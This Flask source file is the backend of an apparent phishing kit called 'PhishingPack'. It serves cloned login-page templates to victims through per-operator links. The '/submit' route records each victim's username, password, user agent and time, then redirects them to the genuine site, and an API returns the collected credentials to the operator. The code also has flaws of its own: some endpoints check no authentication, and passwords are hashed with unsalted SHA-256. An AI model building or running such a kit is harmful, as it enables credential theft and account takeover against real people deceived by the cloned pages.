from flask import Flask, render_template, request, jsonify
from pymongo import MongoClient
import os
from dotenv import load_dotenv
from bson import ObjectId
import hashlib
from json import load

load_dotenv()

app = Flask(__name__)
mongo_uri = os.getenv("MONGODB_URI")
client = MongoClient(mongo_uri)

db = client["PhishingPack"]
users = db["users"]

not_allowed_response = "<p style='font-family: monospace; font-size: 18px'>This type of request is not allowed</p>"
no_id_response = "<p style='font-family: monospace; font-size: 18px'>Invalid Template ID. Please provide a valid Template ID.</p>"
no_template_response = "<p style='font-family: monospace; font-size: 18px'>No Template found with provided ID. Please provide a valid Template ID.</p>"

all_templates = os.listdir("./templates")


@app.route("/", methods=["GET"])
def hello_world():

    if request.method != "GET":
        return not_allowed_response, 405  # Return 405 Method Not Allowed

    t = request.args.get("t")

    if not t or not isinstance(t, str):
        return no_id_response, 400

    try:
        # Convert string ID to Object ID
        object_id = ObjectId(t)
    except:
        return no_id_response, 400

    user = users.find_one({"_id": object_id})
    if not user:
        return no_template_response, 404

    template = user.get("template")
    if not template:
        return f"<p style='font-family: monospace; font-size: 20px; font-weight: 500; text-align: center'>Welcome to PhishingPack, {user['username']}.</p> <p style='font-family: monospace; font-size: 18px; text-align: center'>You have not configured your template yet.</p>"

    return render_template(f"{template}.html")


@app.route("/submit", methods=["POST"])
def submit():

    username = request.form["username"]
    password = request.form["password"]
    user_agent = request.form["user_agent"]
    time = request.form["time"]
    t = request.form["t"]

    object_id = ObjectId(t)
    user = users.find_one({"_id": object_id})
    site = user["template"]

    data_to_save = {
        "site": site.capitalize(),
        "user_agent": user_agent,
        "time": time,
        "username": username,
        "password": password,
    }

    users.update_one({"_id": object_id}, {"$push": {"data": data_to_save}}, upsert=True)

    with open("sites.json", "r") as f:
        sites = load(f)

    redirect_to = None

    for i in sites:
        if i["name"] == site.capitalize():
            redirect_to = i["redirect_to"]

    return redirect_to


@app.route("/api/get-user", methods=["GET", "POST"])
def get_user():
    """Retrieves user information based on provided username."""

    if request.method != "POST":
        return not_allowed_response, 405  # Return 405 Method Not Allowed

    if not request.is_json:
        return (
            jsonify({"error": "Invalid request format. Please send JSON data."}),
            400,
        )  # 400 Bad Request

    username = request.json.get("username")
    if not username or not isinstance(username, str):
        return jsonify({"error": "Invalid username. Please provide a string."}), 400

    # Find user by username
    user = users.find_one({"username": username})

    if not user:
        return jsonify({"error": "User not found."}), 404  # 404 Not Found

    return (
        jsonify(
            {
                "_id": str(user["_id"]),
                "username": user["username"],
                "template": user["template"],
                "data": user["data"],
            }
        ),
        200,
    )


@app.route("/api/add-user", methods=["GET", "POST"])
def add_user():
    """
    Adds a new user to the database, performing comprehensive data validation
    and password hashing for security.
    """

    if request.method != "POST":
        return not_allowed_response, 405  # Return 405 Method Not Allowed

    if not request.is_json:
        return (
            jsonify({"error": "Invalid request format. Please send JSON data."}),
            400,
        )  # 400 Bad Request

    username = request.json.get("username")
    password = request.json.get("password")

    # Validate username:
    if not username or not isinstance(username, str):
        return jsonify({"error": "Invalid username. Please provide a string."}), 400

    # Minimum and maximum username length (adjust as needed):
    min_username_length = 4
    max_username_length = 32
    if len(username) < min_username_length or len(username) > max_username_length:
        return (
            jsonify(
                {
                    "error": f"Username must be between {min_username_length} and {max_username_length} characters long."
                }
            ),
            400,
        )

    # Validate password:
    if not password or not isinstance(password, str):
        return jsonify({"error": "Invalid password. Please provide a string."}), 400

    # Minimum and maximum password length:
    min_password_length = 8
    if len(password) < min_password_length:
        return (
            jsonify(
                {
                    "error": f"Password must be at least {min_password_length} characters long."
                }
            ),
            400,
        )

    # Check for existing user
    existing_user = users.find_one({"username": username})
    if existing_user:
        return jsonify({"error": "Username already exists."}), 409  # 409 Conflict

    # **Hash the password before storing it in the database for security.**
    hashed_password = hashlib.sha256(password.encode()).hexdigest()

    new_user = {
        "_id": ObjectId(),
        "username": username,
        "password": hashed_password,
    }

    users.insert_one(new_user)

    return (
        jsonify(
            {
                "_id": str(new_user["_id"]),
                "username": username,
            }
        ),
        201,
    )


@app.route("/api/authenticate", methods=["GET", "POST"])
def authenticate():
    """
    Authenticates a user based on provided credentials. Returns a token
    on successful authentication (implementation omitted for brevity).
    """

    if request.method != "POST":
        return not_allowed_response, 405  # Return 405 Method Not Allowed

    if not request.is_json:
        return (
            jsonify({"error": "Invalid request format. Please send JSON data."}),
            400,
        )  # 400 Bad Request

    username = request.json.get("username")
    password = request.json.get("password")

    # Validate and sanitize username
    if not username or not isinstance(username, str):
        return jsonify({"error": "Invalid username. Please provide a string."}), 400

    # Find user by username
    user = users.find_one({"username": username})

    if not user:
        # Avoid revealing username availability for security reasons
        return jsonify({"error": "Invalid login credentials."}), 401  # 401 Unauthorized

    # Secure password comparison using hashed password
    hashed_password = hashlib.sha256(
        password.encode()
    ).hexdigest()  # Hash input password
    if hashed_password != user["password"]:  # Compare with stored hash
        return jsonify({"error": "Invalid login credentials."}), 401  # 401 Unauthorized

    return jsonify({"success": True}), 200


@app.route("/api/set-template", methods=["GET", "POST"])
def set_template():
    """Updates a user's template field with a provided template string value."""

    if request.method != "POST":
        return not_allowed_response, 405  # Return 405 Method Not Allowed

    if not request.is_json:
        return (
            jsonify({"error": "Invalid request format. Please send JSON data."}),
            400,
        )  # 400 Bad Request

    username = request.json.get("username")
    template = request.json.get("template")

    # Validate and sanitize username
    if not username or not isinstance(username, str):
        return jsonify({"error": "Invalid username. Please provide a string."}), 400
    if not isinstance(template, str):
        return jsonify({"error": "Invalid template. Please provide a string."}), 400

    if not (template + ".html" in all_templates) and (template != ""):
        return (
            jsonify(
                {
                    "error": f"Invalid Template name '{template}'. Please provide a valid Template name provided by PhishingPack."
                }
            ),
            400,
        )

    # Find user by username
    user = users.find_one({"username": username})

    if not user:
        return (
            jsonify({"error": "Not allowed. Not authenticated from PhishingPack."}),
            401,
        )

    users.update_one({"username": username}, {"$set": {"template": template}})

    return jsonify({"success": True}), 200


@app.route("/api/add-data", methods=["GET", "POST"])
def add_data():
    """Updates a user's data field with a provided data value."""

    if request.method != "POST":
        return not_allowed_response, 405  # Return 405 Method Not Allowed

    if not request.is_json:
        return (jsonify({"error": "Invalid request format. Please send JSON data."}),)

    username = request.json.get("username")
    data = request.json.get("data")

    # Validate and sanitize username
    if not username or not isinstance(username, str):
        return jsonify({"error": "Invalid username. Please provide a string."}), 400
    if not isinstance(data, dict):
        return jsonify({"error": "'data' must be a dictionary."}), 400

    # Find user by username
    user = users.find_one({"username": username})

    if not user:
        return (
            jsonify({"error": "Not allowed. Not authenticated from PhishingPack."}),
            401,
        )

    users.update_one({"username": username}, {"$push": {"data": data}}, upsert=True)
    return jsonify({"success": True}), 200


@app.route("/api/clear-data", methods=["GET", "POST"])
def clear_data():
    """Clears a user's data field."""
    if request.method != "POST":
        return not_allowed_response, 405  # Return 405 Method Not Allowed
    if not request.is_json:
        return (
            jsonify({"error": "Invalid request format. Please send JSON data."}),
            400,
        )

    username = request.json.get("username")
    if not username or not isinstance(username, str):
        return jsonify({"error": "Invalid username. Please provide a string."}), 400

    users.update_one({"username": username}, {"$set": {"data": []}})
    return jsonify({"success": True}), 200


if __name__ == "__main__":
    app.run(debug=True)
